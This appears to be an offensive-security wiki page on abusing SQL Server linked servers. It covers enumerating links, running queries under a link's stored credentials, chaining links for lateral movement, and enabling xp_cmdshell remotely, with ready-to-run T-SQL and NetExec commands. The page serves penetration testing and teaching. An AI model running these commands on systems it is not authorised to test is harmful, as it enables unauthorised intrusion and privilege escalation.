---
title: "MSSQL linked servers: querying and executing across trust links"
description: "Abusing SQL Server linked-server configurations to query and execute on other instances under the link's stored credentials, chaining links for lateral movement and reaching command execution on servers you never authenticated to."
keywords:
  - linked servers
  - openquery
  - RPC out
  - sp_linkedservers
  - lateral movement
---

# MSSQL linked servers

A **linked server** lets one SQL Server run queries against another, authenticating with credentials stored in the link. Those credentials are frequently **more privileged** than your own, and links often form chains between instances, so enumerating and hopping them is a reliable lateral-movement and escalation path, sometimes straight to command execution on a server you never logged into.

## Enumerate and hop

```sql
EXEC sp_linkedservers;                              -- configured links
-- run a query on the linked server under its stored credentials
SELECT * FROM OPENQUERY([LINKED-SRV], 'SELECT SUSER_SNAME(), IS_SRVROLEMEMBER(''sysadmin'')');
-- or, with RPC out enabled, EXEC ... AT the link
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED-SRV];
```

Links chain: an `OPENQUERY` can target a link that itself has a link, so nest to reach deeper instances.

## Command execution over a link

If the link's context is sysadmin on the remote instance, enable and run `xp_cmdshell` there (needs RPC out on the link):

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED-SRV];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED-SRV];
EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SRV];
```

```bash
# PowerUpSQL maps and crawls link chains automatically, resolving the effective rights at each hop
# Get-SQLServerLinkCrawl -Instance <srv>
# NetExec: enable cmdshell over a link
nxc mssql <target> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=<name> ACTION=enable
```

## Exploitation notes

- The leverage is the **stored link credential**: a link configured with a sysadmin or a different domain account escalates you regardless of your own rights.
- `Get-SQLServerLinkCrawl` (PowerUpSQL) is the fastest way to see the full reachable graph and where sysadmin appears, so crawl before hand-hopping.
- `OPENQUERY` works with only data-access rights; `EXEC ... AT` needs **RPC out** enabled on the link, which many are.
- A link chain can cross domain and network boundaries the direct network cannot, so treat links as a routing layer, not just a query feature.

## Tools

- **PowerUpSQL** (`Get-SQLServerLinkCrawl -Query`): crawl the link graph and run a query at each reachable instance.
- **Impacket `mssqlclient.py`** (`enum_links`): list and use links interactively.
- **NetExec `mssql`** (`-M link_enable_cmdshell`): enable command execution over a link.

## References

- [NetExec: MSSQL linked servers](https://www.netexec.wiki/mssql-protocol)
- [PowerUpSQL: linked server crawling](https://github.com/NetSPI/PowerUpSQL/wiki)
- [Microsoft: sp_linkedservers](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-linkedservers-transact-sql)
